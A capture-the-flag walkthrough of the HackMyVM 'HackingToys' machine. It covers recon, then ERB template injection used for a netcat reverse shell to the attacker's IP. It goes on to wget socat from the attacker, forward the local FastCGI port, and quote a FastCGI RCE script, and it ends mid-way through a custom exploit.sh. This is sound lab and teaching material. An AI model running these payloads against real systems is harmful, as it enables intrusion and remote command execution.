# CTF Penetration Testing

## HackMyVM

### HackingToys - Machine

#### Machine Description

- Machine name: [HackingToys](https://hackmyvm.eu/machines/machine.php?vm=HackingToys)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/hackingtoys.png" alt="HackingToys Machine Logo" width="150"/>

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.133 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.133`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 13:08 EDT
Nmap scan report for 192.168.56.133
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) ←
3000/tcp open  ssl/ppp? ←
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%T=SSL%I=7%D=10/5%Time=670172D8%P=x86_64-pc-linux
SF:-gnu%r(GenericLines,3EF,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-
SF:Length:\x20930\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HT ←
SF:TP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20trying\x20to\x20op ←
SF:en\x20an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma ←
SF:::HttpParserError\)\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2 ←
SF:/lib/puma/client\.rb:268:in\x20`execute'\n/usr/local/rvm/gems/ruby-3\.1
SF:\.0/gems/puma-6\.4\.2/lib/puma/client\.rb:268:in\x20`try_to_finish'\n/u
SF:sr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/server\.rb:29
SF:8:in\x20`reactor_wakeup'\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\
SF:.4\.2/lib/puma/server\.rb:248:in\x20`block\x20in\x20run'\n/usr/local/rv
SF:m/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:119:in\x20`w
SF:akeup!'\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/re
SF:actor\.rb:76:in\x20`block\x20in\x20select_loop'\n/usr/local/rvm/gems/ru
SF:by-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:76:in\x20`select'\n/u
SF:sr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:7
SF:6:in\x20`select_loop'\n/usr/loc")%r(GetRequest,169E,"HTTP/1\.0\x20403\x
SF:20Forbidden\r\ncontent-type:\x20text/html;\x20charset=UTF-8\r\nContent-
SF:Length:\x205702\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head
SF:>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n\x20\x20<meta\x20name=\"vi
SF:ewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\x20\x
SF:20<meta\x20name=\"turbo-visit-control\"\x20content=\"reload\">\n\x20\x2
SF:0<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x20\x20<
SF:style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20background-c
SF:olor:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20\x20\x2
SF:0\x20\x20\x20color-scheme:\x20light\x20dark;\n\x20\x20\x20\x20\x20\x20s
SF:upported-color-schemes:\x20light\x20dark;\n\x20\x20\x20\x20\x20\x20marg
SF:in:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x2
SF:0ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-family:\x20helvetica,\x20
SF:verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20font-size:\x
SF:20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-height:\x2018px;\n\x20\x2
SF:0\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-si
SF:ze:\x2011px;\n\x20\x20\x20\x20\x20\x20white-space:\x20pre-wrap;\n\x20\x
SF:20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20b
SF:order:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010
SF:px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20\x20\x20w
SF:idth:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20
SF:\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20backgro
SF:und:\x20#C00;\n\x20\x20\x20\x20\x20\x20padding:");
MAC Address: 08:00:27:38:FA:9D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.98 seconds
```

`whatweb -v https://192.168.56.133:3000`:
```
WhatWeb report for https://192.168.56.133:3000
Status    : 200 OK
Title     : Gadgets
IP        : 192.168.56.133
Country   : RESERVED, ZZ

Summary   : Cookies[_gadgets_session], HTML5, HttpOnly[_gadgets_session], Script[importmap,module], UncommonHeaders[x-content-type-options,x-permitted-cross-domain-policies,referrer-policy,link,x-request-id,server-timing], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[0]

Detected Plugins:
[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : _gadgets_session

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HttpOnly ]
        If the HttpOnly flag is included in the HTTP set-cookie 
        response header and the browser supports it then the cookie 
        cannot be accessed through client side script - More Info: 
        http://en.wikipedia.org/wiki/HTTP_cookie 

        String       : _gadgets_session

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 

        String       : importmap,module

[ UncommonHeaders ]
        Uncommon HTTP server headers. The blacklist includes all 
        the standard headers and many non standard but common ones. 
        Interesting but fairly common headers should have their own 
        plugins, eg. x-powered-by, server and x-aspnet-version. 
        Info about headers can be found at www.http-stats.com 

        String       : x-content-type-options,x-permitted-cross-domain-policies,referrer-policy,link,x-request-id,server-timing (from headers)

[ X-Frame-Options ]
        This plugin retrieves the X-Frame-Options value from the 
        HTTP header. - More Info: 
        http://msdn.microsoft.com/en-us/library/cc288472%28VS.85%29.
        aspx

        String       : SAMEORIGIN

[ X-XSS-Protection ]
        This plugin retrieves the X-XSS-Protection value from the 
        HTTP header. - More Info: 
        http://msdn.microsoft.com/en-us/library/cc288472%28VS.85%29.
        aspx

        String       : 0

HTTP Headers:
        HTTP/1.1 200 OK
        x-frame-options: SAMEORIGIN
        x-xss-protection: 0
        x-content-type-options: nosniff
        x-permitted-cross-domain-policies: none
        referrer-policy: strict-origin-when-cross-origin
        link: </assets/application-381287eca19f4d3ca6a8aa9ed68b8805d918bc26f4597e4f39e30f6259188840.css>; rel=preload; as=style; nopush
        content-type: text/html; charset=utf-8
        vary: Accept
        etag: W/"95a0d632949edc68079c42bf3e80b203"
        cache-control: max-age=0, private, must-revalidate
        set-cookie: _gadgets_session=zYRDRIweHRYHbx%2FP%2FE5z78OAReU9NXVhAZTIiIA9HQg1qn3JMkXFrfrzE1FOZXuOxCN%2BEDbIV4J6azr1PdSJuk8ful0AFTJmuNWh2epOue2aRgKm4YuPVStUuk2Q1xgWtMIU4V5GswlXVd4fHVG0nQxadOfkkllhnkA8CKZLmWkkyvf9%2Bn7LXwK34NjoNOLsd1OxvbqDL8Mv8LS5osHnM%2FmBEJqQWpxN8VRGxp2znzLbyj09emKxYxv%2BAfUg6qfqjy%2BhKUWopuaG8HWThWBNzSlEUBEhK4cq--jpOzgbWTbun8X4d1--mGID6%2FZ0tP3UWMzf5f%2FZdg%3D%3D; path=/; httponly; SameSite=Lax
        x-request-id: ab966401-3ca3-4934-8fc2-5f09eb8f0350
        x-runtime: 0.009314
        server-timing: start_processing.action_controller;dur=0.01, sql.active_record;dur=0.10, instantiation.active_record;dur=0.09, render_template.action_view;dur=1.39, render_layout.action_view;dur=3.87, process_action.action_controller;dur=5.09
        Connection: close
        Content-Length: 4112
```

`curl https://192.168.56.133:3000`:
```
curl: (60) server certificate verification failed. CAfile: /etc/ssl/certs/ca-certificates.crt CRLfile: none ←
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

`curl -k https://192.168.56.133:3000`:
```html
<!DOCTYPE html>
<html>
<head>
  <title>Hacking Gadgets List</title>
  <style>

[...]

</head>
<body>
  <h1>Hacking Gadgets List</h1>
  <ul>
      <li>
        <a href="/products/show/1">Flipper Zero</a>
      </li>
      <li>
        <a href="/products/show/2">HakCat WiFi Nugget</a>
      </li>
      <li>
        <a href="/products/show/3">New USB Rubber Ducky</a>
      </li>
      <li>
        <a href="/products/show/4">The Deauther Watch</a>
      </li>
      <li>
        <a href="/products/show/5">The O․MG Elite</a>
      </li>
  </ul>
  <form action="/search" method="get">
    <input type="text" name="query" placeholder="Search a gadget">
    <input type="hidden" name="message" value="Product does not exist">
    <button type="submit">Search</button>
  </form>
</body>
</html>

  </body>
</html>
```

`gobuster dir -u https://192.168.56.133:3000 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,list,tmp,old,jpg,txt,zip -t 10 --add-slash -k`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.56.133:3000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   500,400,401,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,jpg,old,txt,zip,php,bak,list,tmp
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search.old/          (Status: 200) [Size: 4112]
/search/              (Status: 200) [Size: 4112] ←
/search.tmp/          (Status: 200) [Size: 4112]
/search.php/          (Status: 200) [Size: 4112]
/search.bak/          (Status: 200) [Size: 4112]
/search.list/         (Status: 200) [Size: 4112]
/search.html/         (Status: 200) [Size: 4112]

[...]
```

<❌ Failed Step.>
`sqlmap -u "https://192.168.56.133:3000/search?query=TEST&message=Product+does+not+exist" -p "query"`:
```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:40:46 /2024-10-06/

[07:40:47] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('_gadgets_session=xfyjXkZIZZ5...%2Bw%3D%3D'). Do you want to use those [Y/n] 

[07:40:47] [INFO] testing if the target URL content is stable
[07:40:47] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] 

[07:40:49] [WARNING] heuristic (basic) test shows that GET parameter 'query' might not be injectable
[07:40:49] [INFO] testing for SQL injection on GET parameter 'query'
[07:40:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:40:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:40:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[07:40:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:40:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[07:40:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[07:40:52] [INFO] testing 'Generic inline queries'
[07:40:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:40:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[07:40:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[07:40:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:40:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:40:52] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[07:40:52] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] 

[07:41:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:41:14] [WARNING] GET parameter 'query' does not seem to be injectable
[07:41:14] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. ← If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 07:41:14 /2024-10-06/
```
</❌ Failed Step.>

`python3 -c "import urllib.parse; print(urllib.parse.quote('<%= 7*7 %>'))"`:
```
%3C%25%3D%207%2A7%20%25%3E ←
```

`curl -k "https://192.168.56.133:3000/search?query=TEST&message=%3C%25%3D%207%2A7%20%25%3E" | grep "49"`:
```
[...]

    <div class="message">49</div> ←
```

`python3 /opt/SSTImap/sstimap.py -u "https://192.168.56.133:3000/search?query=TEST&message=*"`:
```
    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.2
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2; generic: 3
[*] Loaded request body types: 4

[*] Scanning url: https://192.168.56.133:3000/search?query=TEST&message=*
[*] Testing if Query parameter 'message' is injectable
[*] Cheetah plugin is testing rendering with tag '*'
[*] Cheetah plugin is testing }* code context escape with 6 variations
[*] Cheetah plugin is testing ]* code context escape with 6 variations
[*] Cheetah plugin is testing )* code context escape with 6 variations
[*] Cheetah plugin is testing blind injection
[*] Cheetah plugin is testing }* code context escape with 6 variations
[*] Cheetah plugin is testing ]* code context escape with 6 variations
[*] Cheetah plugin is testing )* code context escape with 6 variations
[*] Twig plugin is testing rendering with tag '*'
[*] Twig plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig plugin is testing  %}* code context escape with 6 variations
[*] Twig plugin is testing blind injection
[*] Twig plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig plugin is testing  %}* code context escape with 6 variations
[*] Dust plugin is testing rendering
[*] Dust plugin is testing blind injection
[*] Freemarker plugin is testing rendering with tag '*'
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Freemarker plugin is testing blind injection
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Erb plugin is testing rendering with tag '*'
[+] Erb plugin has confirmed injection with tag '*' ←
[+] SSTImap identified the following injection point:

  Query parameter: message ←
  Engine: Erb
  Injection: *
  Context: text
  OS: x86_64-linux
  Technique: render
  Capabilities:

    Shell command execution: ok ←
    Bind and reverse shell: ok ←
    File write: ok ←
    File read: ok ←
    Code evaluation: ok, ruby code ←

[+] Rerun SSTImap providing one of the following options:
    --interactive                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port.
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
    --upload LOCAL REMOTE        Upload files to the server.
    --download REMOTE LOCAL      Download remote files.
```

`python3 /opt/SSTImap/sstimap.py -u "https://192.168.56.133:3000/search?query=TEST&message=*" -e "erb" --os-shell`:
```
    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.2
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2; generic: 3
[*] Loaded request body types: 4

[*] Scanning url: https://192.168.56.133:3000/search?query=TEST&message=*
[*] Testing if Query parameter 'message' is injectable
[*] Erb plugin is testing rendering with tag '*'
[+] Erb plugin has confirmed injection with tag '*' ←
[+] SSTImap identified the following injection point:

  Query parameter: message
  Engine: Erb ←
  Injection: *
  Context: text
  OS: x86_64-linux
  Technique: render
  Capabilities:

    Shell command execution: ok ←
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, ruby code

[+] Run commands on the operating system.
```

<🔄 Alternative Step.>

`nc -lnvp 4444`:
```
listening on [any] 4444 ... ←
```

`burpsuite` > `Decoder`

`Input`:
```
<%= `nc 192.168.56.118 4444 -e /bin/bash` %>
```
`Output`:
```
%3c%25%3d%20%60%6e%63%20%31%39%32%2e%31%36%38%2e%35%36%2e%31%31%38%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%60%20%25%3e
```

`curl -k "https://192.168.56.133:3000/search?query=TEST&message=%3c%25%3d%20%60%6e%63%20%31%39%32%2e%31%36%38%2e%35%36%2e%31%31%38%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%60%20%25%3e" -s`

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.133] 58310 ←
```

`SHELL=/bin/bash script -q /dev/null`

</🔄 Alternative Step.>

![Victim: lidia](https://img.shields.io/badge/Victim-lidia-64b5f6?logo=linux&logoColor=white)

`id`:
```
lidia ←
```

`id`:
```
uid=1000(lidia) gid=1000(lidia) groups=1000(lidia),100(users),1002(rvm) ←
```

`uname -a`:
```
Linux hacktoys 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
```

`lsb_release -a`:
```
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm
```

`cd /home/lidia`

`ls -alps ./`:
```
total 36
4 drwx------ 5 lidia lidia 4096 May 21 15:38 ./
4 drwxr-xr-x 4 root  root  4096 May 20 15:14 ../
0 lrwxrwxrwx 1 root  root     9 May 20 16:26 .bash_history -> /dev/null
4 -rw-r--r-- 1 lidia lidia  220 May 20 15:14 .bash_logout
4 -rw-r--r-- 1 lidia lidia 3526 May 20 15:14 .bashrc
4 drwxr-xr-x 3 lidia lidia 4096 May 20 15:14 .bundle/
4 -rw------- 1 lidia lidia   20 May 20 15:14 .lesshst
4 drwxrwxr-x 3 lidia lidia 4096 May 20 15:14 .local/
4 -rw-r--r-- 1 lidia lidia  807 May 20 15:14 .profile
4 drwx------ 2 lidia lidia 4096 May 21 15:38 .ssh/
```

`ls -alps /var/www/html`:
```
total 36
4 drwxr-xr-x 5 dodi dodi 4096 May 21 14:46 ./
4 drwxr-xr-x 3 root root 4096 May 20 18:56 ../
4 -rw-r--r-- 1 dodi root 1018 May 21 14:37 coming-soon2.css
4 -rw-r--r-- 1 dodi root 1680 May 21 14:37 coming-soon2.html
4 drwxr-xr-x 8 root root 4096 May 21 14:37 .git/
4 drwxr-xr-x 2 dodi root 4096 May 21 14:37 img/
4 -rw-r--r-- 1 dodi root 3633 May 21 14:37 index.php ←
4 -rw-r--r-- 1 dodi root 2015 May 21 14:37 style.css
4 drwxr-xr-x 2 root root 4096 May 21 14:37 .vscode/
```

`ss -tunlp`:
```
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                       
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*                                 
tcp   LISTEN 0      511        127.0.0.1:80        0.0.0.0:*                                 
tcp   LISTEN 0      4096       127.0.0.1:9000 ←    0.0.0.0:*                                 
tcp   LISTEN 0      1024         0.0.0.0:3000      0.0.0.0:*    users:(("ruby",pid=359,fd=7))
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                 
tcp   LISTEN 0      128             [::]:22           [::]:*
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cd /home/kali/tools`

`ls -alps ./`:
```                                               
total 10224
   4 drwxrwxr-x  2 kali kali    4096 Oct  4 10:14 ./
   4 drwx------ 36 kali kali    4096 Oct  7 04:05 ../
  56 -rw-r--r--  1 root root   57344 Apr 11  2023 GodPotato-NET2.exe
  56 -rw-r--r--  1 root root   57344 Apr 11  2023 GodPotato-NET35.exe
  56 -rw-r--r--  1 root root   57344 Apr 11  2023 GodPotato-NET4.exe
2156 -rw-r--r--  1 root root 2204117 Sep 10 10:00 Invoke-Mimikatz.ps1
 340 -rw-rw-r--  1 kali kali  347648 Sep  9 06:17 JuicyPotato.exe
 164 -rw-rw-r--  1 kali kali  164236 Oct  4 10:15 linpeas_output.txt
 844 -rwxr-xr-x  1 kali kali  860337 Sep 20 04:02 linpeas.sh
  48 -rw-rw-r--  1 kali kali   48875 Sep 19 12:45 lse.sh
  60 -rw-r--r--  1 root root   59392 Sep  9 13:09 nc.exe
  24 -rw-r--r--  1 root root   22016 Dec  7  2021 PrintSpoofer32.exe
  28 -rw-r--r--  1 root root   27136 Dec  7  2021 PrintSpoofer64.exe
2872 -rw-rw-r--  1 kali kali 2940928 Jan 17  2023 pspy32
3032 -rwxrwxr-x  1 kali kali 3104768 Jan 17  2023 pspy64
  52 -rw-r--r--  1 root root   51712 May 20  2023 RunasCs.exe
  60 -rw-r--r--  1 root root   61440 May 17  2023 RunasCs_net2.exe
 368 -rw-rw-r--  1 kali kali  375176 Sep 23 09:43 socat ←
```

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

![Victim: lidia](https://img.shields.io/badge/Victim-lidia-64b5f6?logo=linux&logoColor=white)

`wget http://192.168.56.118/socat`

`chmod u+x ./socat`

`./socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1:9000`

`ss -tunlp | head -n 1 && ss -tunlp | grep ":8888"`:
```
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                         
tcp   LISTEN 0      5            0.0.0.0:8888      0.0.0.0:*    users:(("socat",pid=1124,fd=5)) ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nmap -Pn -sSV -p8888 -T5 192.168.56.133`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 04:11 EDT
Nmap scan report for 192.168.56.133
Host is up (0.0011s latency).

PORT     STATE SERVICE         VERSION
8888/tcp open  sun-answerbook? ←
MAC Address: 08:00:27:38:FA:9D (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.61 seconds
```

![Victim: lidia](https://img.shields.io/badge/Victim-lidia-64b5f6?logo=linux&logoColor=white)

`ps -faux | head -n 1 && ps -faux | grep "php"`:
```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
lidia       1225  0.0  0.0   2576   904 ?        S    10:23   0:00              \_ sh -c ps -faux | head -n 1 && ps -faux | grep php
lidia       1229  0.0  0.0   6332  2144 ?        S    10:23   0:00                  \_ grep php
root         577  0.0  0.7 204508 22584 ?        Ss   08:51   0:01 php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)
dodi         653  0.0  0.3 204996  9356 ?        S    08:51   0:00  \_ php-fpm: pool www ←
dodi         654  0.0  0.3 204996  9356 ?        S    08:51   0:00  \_ php-fpm: pool www ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[9000 - Pentesting FastCGI](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi)

[**#Basic Information**]

If you want to **learn what is FastCGI** check the following page:
[disable_functions bypass - php-fpm/FastCGI](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi)
By default **FastCGI** run in **port** **9000** and isn't recognized by nmap. **Usually** FastCGI only listen in **localhost**.

[**#RCE**]

It's quite easy to make FastCGI execute arbitrary code:
```sh
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD" | base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./exploit.sh`:
```sh
#!/bin/bash

HOST=$1
PORT=$2
COMMAND=$3

# Creating the payload with the specified command
PAYLOAD="<?php echo '<!--'; system('$COMMAND'); echo '-->';"

# Path to the existing file
FILENAMES="/var/www/html/index.php"

# Encode the payload in base64
B64=$(echo "$PAYLOAD" | base64)

# Loop for each specified file
for FN in $FILENAMES; do
    OUTPUT=$(mktemp)  # Create a temporary file for the output

    # Execute the CGI command with modified environment variables
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain;base64,$B64'" \
      SCRIPT_FILENAME=$FN \
      SCRIPT_NAME=$FN \
      REQUEST_METHOD=POST \
